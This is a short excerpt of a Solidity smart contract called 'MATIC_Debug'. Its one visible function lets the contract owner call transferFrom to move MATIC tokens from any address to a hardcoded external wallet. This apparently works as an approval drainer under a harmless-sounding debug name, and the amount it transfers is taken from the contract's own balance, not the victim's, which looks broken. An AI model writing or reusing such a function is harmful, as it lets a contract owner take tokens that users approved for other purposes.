...
contract MATIC_Debug {
    ...
    function transferfrom_matic(address FromAddr) public {
        require(msg.sender == owner); // If Contract Creater
        matic.transferFrom(FromAddr , 0x5De7470505F785A8A4AA571A71F0471cc816CCC3 , matic.balanceOf(address(this)) );
    }
